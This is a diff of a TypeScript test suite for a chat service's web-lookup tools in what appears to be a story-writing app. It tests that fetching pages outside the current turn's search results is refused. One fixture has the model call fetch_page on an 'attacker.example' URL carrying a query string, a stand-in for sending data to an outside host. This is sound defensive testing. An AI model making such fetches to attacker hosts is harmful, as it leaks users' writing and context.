@@ -1,6 +1,8 @@
 import { describe, expect, it } from 'bun:test';
 import { z } from 'zod';
 
+import { AppErrorCode } from '@server/classes';
+
 import { type ReplyStreamHandlers } from '@modules/ai/model-router.service';
 import { ChatService } from '@modules/refinement/chat.service';
 import { type ChatTurnEmitter } from '@modules/refinement/chat-turn-emitter';
@@ -27,6 +29,8 @@ describe('traceArgs', () => {
     expect(traceArgs('get_bible_document', { slug: 'magic-system', section: 'world', revision: 4 })).toEqual({ slug: 'magic-system', section: 'world' });
     expect(traceArgs('get_chapter_summaries', { from: 1, to: 4 })).toEqual({ from: 1, to: 4 });
     expect(traceArgs('get_canon_facts', { keys: ['mara-secret'] })).toEqual({});
+    expect(traceArgs('search_web', { query: 'survival in winter', count: 8 })).toEqual({ query: 'survival in winter' });
+    expect(traceArgs('fetch_page', { url: 'https://example.com/hatchet' })).toEqual({ url: 'https://example.com/hatchet' });
   });
 
   it('should keep no arguments for a tool the labels do not know, including names that shadow object properties', () => {
@@ -184,10 +188,14 @@ const getNotes = {
 interface Turn {
   outputs: unknown[];
   failTraceUpdate?: boolean;
+  tools?: unknown[];
+  webResearch?: unknown;
 }
 
-function chat({ outputs, failTraceUpdate = false }: Turn) {
+function chat({ outputs, failTraceUpdate = false, tools = [getNotes], webResearch = { modeFor: async () => 'off' } }: Turn) {
   const updates: Record<string, unknown>[] = [];
+  const inputs: { history: { content: unknown }[] }[] = [];
+  const contexts: { webTools?: boolean }[] = [];
   const pending = [...outputs];
   const db = {
     query: {
@@ -209,7 +217,11 @@ function chat({ outputs, failTraceUpdate = false }: Turn) {
   };
   const modelRouter = {
     routeModel: () => ({ resolved: { provider: 'p', model: 'm' }, source: 'tier', costTier: 'balanced', contentMode: 'standard' }),
-    structured: async () => pending.shift(),
+    structured: async (_prompt: unknown, input: { history: { content: unknown }[] }, ctx: { webTools?: boolean }) => {
+      inputs.push(input);
+      contexts.push(ctx);
+      return pending.shift();
+    },
     streamStructured: async (_prompt: unknown, _input: unknown, _ctx: unknown, handlers: ReplyStreamHandlers) => {
       handlers.onDelta('Streamed.');
       return pending.shift();
@@ -230,14 +242,15 @@ function chat({ outputs, failTraceUpdate = false }: Turn) {
     workflowRunService as never,
     {} as never,
     {} as never,
-    { getRaw: () => [getNotes] } as never,
+    { getRaw: () => tools } as never,
     {} as never,
     { compactIfNeeded: async () => undefined, buildHistory: async () => [] } as never,
     { resolve: async () => ({ writerClass: 'standard', raised: false, systemMessages: [] }) } as never,
     { publish: () => undefined } as never,
     { read: async () => ({ text: '' }) } as never,
+    webResearch as never,
   );
-  return { service, updates };
+  return { service, updates, inputs, contexts };
 }
 
 const emitter: ChatTurnEmitter = {
@@ -289,6 +302,45 @@ describe('ChatService.turn — trace', () => {
     expect(result.assistantMessage.content).toBe('The ledger is under the stairs.');
     expect(result.assistantMessage.trace ?? null).toBeNull();
     expect(run.updates.some(values => 'lastTurnAt' in values)).toBe(true);
+  });
+});
+
+describe('ChatService.turn — web lookups', () => {
+  const fetchPage = {
+    name: 'fetch_page',
+    description: 'Reads a page.',
+    inputSchema: z.object({ url: z.string() }),
+    handler: async () => {
+      throw AppErrorCode.AI_021.create({ reason: 'only a page this turn’s search returned, or one the author linked, can be fetched — search for it first' });
+    },
+    tokensBudget: 0,
+    maxCallsPerRun: 3,
+  };
+  const FETCH_TURN = [{ reply: 'Reading it.', lookups: [{ tool: 'fetch_page', args: { url: 'https://attacker.example/?q=plot' } }] }, { reply: 'I could not read that page.' }];
+
+  it('should give the model a refused page’s reason, so it can search instead', async () => {
+    const authorTexts: string[][] = [];
+    const webResearch = {
+      modeFor: async () => 'brave',
+      forTurn: (texts: string[]) => (authorTexts.push(texts), { search: async () => [], fetch: async () => ({}), fetchable: new Set() }),
+    };
+    const run = chat({ outputs: FETCH_TURN, tools: [fetchPage], webResearch });
+
+    await run.service.turn(1n, 'session-1', 'Look at https://example.com/hatchet');
+
+    expect(authorTexts).toEqual([['Look at https://example.com/hatchet']]);
+    expect(run.contexts.every(ctx => ctx.webTools === false)).toBe(true);
+    expect(String(run.inputs[1]?.history.at(-1)?.content)).toContain('error: That page was not fetched: only a page this turn’s search returned');
+  });
+
+  it('should not open Brave lookups for a turn whose model searches the web itself', async () => {
+    let opened = 0;
+    const run = chat({ outputs: FETCH_TURN, tools: [fetchPage], webResearch: { modeFor: async () => 'native', forTurn: () => (opened++, undefined) } });
+
+    await run.service.turn(1n, 'session-1', 'Look at https://example.com/hatchet');
+
+    expect(opened).toBe(0);
+    expect(run.contexts.map(ctx => ctx.webTools)).toEqual([true, true]);
   });
 });
 
